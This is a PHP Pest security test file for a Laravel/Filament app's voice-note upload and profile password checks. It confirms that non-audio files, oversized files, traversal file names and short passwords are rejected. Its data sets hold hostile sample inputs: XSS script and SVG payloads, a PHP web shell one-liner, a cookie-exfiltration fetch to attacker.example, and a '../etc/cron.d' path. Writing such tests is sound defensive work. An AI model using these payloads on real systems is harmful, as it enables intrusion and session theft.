<?php

declare(strict_types=1);

use App\Filament\Resources\CaptureSessions\Pages\ListCaptureSessions;
use App\Models\Recording;
use App\Stt\Support\WavFile;
use Filament\Auth\Pages\EditProfile;
use Filament\Facades\Filament;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Queue;
use Illuminate\Support\Facades\Storage;
use League\MimeTypeDetection\FinfoMimeTypeDetector;
use Livewire\Livewire;
use Tests\Feature\Security\Support\SecurityFixtures as Fx;

afterEach(fn () => Fx::cleanupDisks());

beforeEach(function () {
    Queue::fake();
    Fx::fakeDisk('recordings');
    Fx::fakeDisk('local');
    $admin = Fx::superAdmin();
    $admin->saveAppAuthenticationSecret('JBSWY3DPEHPK3PXP'); // enrolled, so the console audio route is reachable
    $this->actingAs($admin->fresh());
    Filament::setCurrentPanel('admin');
});

function secWav(int $dataBytes = 3200): string
{
    return WavFile::header(1, 16000, 16, $dataBytes).str_repeat("\0", $dataBytes);
}

/** @return list<string> every file currently stored on a disk */
function secFiles(string $disk): array
{
    return Storage::disk($disk)->allFiles();
}

/**
 * A fake upload that declares the type the server would detect from its bytes. While tests run, Livewire reports the
 * declared type of an upload instead of sniffing its content, so the declaration mirrors what
 * TemporaryUploadedFile::detectMimeTypeFromContents() returns outside tests.
 */
function secUploadAsSniffed(string $name, string $content): UploadedFile
{
    $sniffed = $content === '' ? null : (new FinfoMimeTypeDetector)->detectMimeTypeFromBuffer($content);

    return UploadedFile::fake()->createWithContent($name, $content)->mimeType($sniffed ?: 'application/octet-stream');
}

it('turns a valid audio upload into an encrypted recording and removes the plaintext upload', function () {
    $file = UploadedFile::fake()->createWithContent('call.wav', secWav());

    Livewire::test(ListCaptureSessions::class)->callAction('uploadVoiceNote', ['audio' => $file, 'title' => 'Memo'])->assertHasNoActionErrors();

    $recording = Recording::query()->firstOrFail();
    expect($recording->mime)->toBeIn(['audio/wav', 'audio/x-wav', 'audio/wave'])
        ->and($recording->isReady())->toBeTrue()
        ->and($recording->stored_path)->toEndWith('.elr');
    expect(array_filter(secFiles('local'), fn (string $path) => str_starts_with($path, 'tmp-uploads/')))->toBe([]);
    expect(Storage::disk('recordings')->get($recording->stored_path))->not->toContain('RIFF');
});

it('refuses files that are not audio, whatever their extension claims', function (string $name, string $content) {
    $file = secUploadAsSniffed($name, $content);

    try {
        Livewire::test(ListCaptureSessions::class)->callAction('uploadVoiceNote', ['audio' => $file]);
    } catch (Throwable) {
        // a loud refusal is fine; what matters is what ended up stored
    }

    expect(Recording::query()->count())->toBe(0);
    expect(secFiles('recordings'))->toBe([]);
})->with([
    'html named ogg' => ['evil.ogg', '<!doctype html><script>alert(document.domain)</script>'],
    'svg named wav' => ['evil.wav', '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>'],
    'php named mp3' => ['evil.mp3', '<?php system($_GET["c"]); ?>'],
    'windows executable named flac' => ['evil.flac', "MZ\x90\x00\x03\x00\x00\x00"],
    'javascript named webm' => ['evil.webm', 'fetch("//attacker.example/?"+document.cookie)'],
    'empty file' => ['empty.wav', ''],
]);

it('refuses an upload above the size cap', function () {
    $file = UploadedFile::fake()->createWithContent('big.wav', secWav(13 * 1024 * 1024));

    try {
        Livewire::test(ListCaptureSessions::class)->callAction('uploadVoiceNote', ['audio' => $file]);
    } catch (Throwable) {
    }

    expect(Recording::query()->count())->toBe(0);
});

it('never lets the uploaded file name reach a stored path', function () {
    $file = UploadedFile::fake()->createWithContent('../../../../etc/cron.d/pwn.wav', secWav());

    try {
        Livewire::test(ListCaptureSessions::class)->callAction('uploadVoiceNote', ['audio' => $file]);
    } catch (Throwable) {
    }

    foreach (secFiles('recordings') as $path) {
        expect($path)->toMatch('~^files/\d{4}/\d{2}/[0-9a-z]{26}\.elr$~i');
    }
});

it('refuses a new profile password shorter than the twelve characters the CLI demands', function (string $password) {
    $admin = auth()->user();

    Livewire::test(EditProfile::class)
        ->fillForm(['name' => $admin->name, 'email' => $admin->email, 'currentPassword' => 'password', 'password' => $password, 'passwordConfirmation' => $password])
        ->call('save')
        ->assertHasFormErrors(['password']);

    expect(Hash::check($password, $admin->fresh()->password))->toBeFalse();
})->with(['12345678', 'password', 'abcdefgh', 'Aa1!aaaa', 'elevenchars'])
    ->skip('A6.W23: the console profile accepts passwords shorter than the 12 characters the CLI requires');

it('accepts a long profile password', function () {
    $admin = auth()->user();
    $password = 'a-sufficiently-long-passphrase-42';

    Livewire::test(EditProfile::class)
        ->fillForm(['name' => $admin->name, 'email' => $admin->email, 'currentPassword' => 'password', 'password' => $password, 'passwordConfirmation' => $password])
        ->call('save')
        ->assertHasNoFormErrors();

    expect(Hash::check($password, $admin->fresh()->password))->toBeTrue();
});

it('never serves a console upload back with an active document type such as text/html or image/svg+xml', function (string $name, string $content) {
    Livewire::test(ListCaptureSessions::class)->callAction('uploadVoiceNote', ['audio' => secUploadAsSniffed($name, $content)]);
    $recording = Recording::query()->first();

    $type = $recording === null ? 'audio/none' : (string) $this->get('/admin-media/recordings/'.$recording->id)->headers->get('Content-Type');

    expect($type)->toStartWith('audio/');
})->with([
    'html named ogg' => ['evil.ogg', '<!doctype html><script>alert(document.domain)</script>'],
    'svg named wav' => ['evil.wav', '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>'],
]);
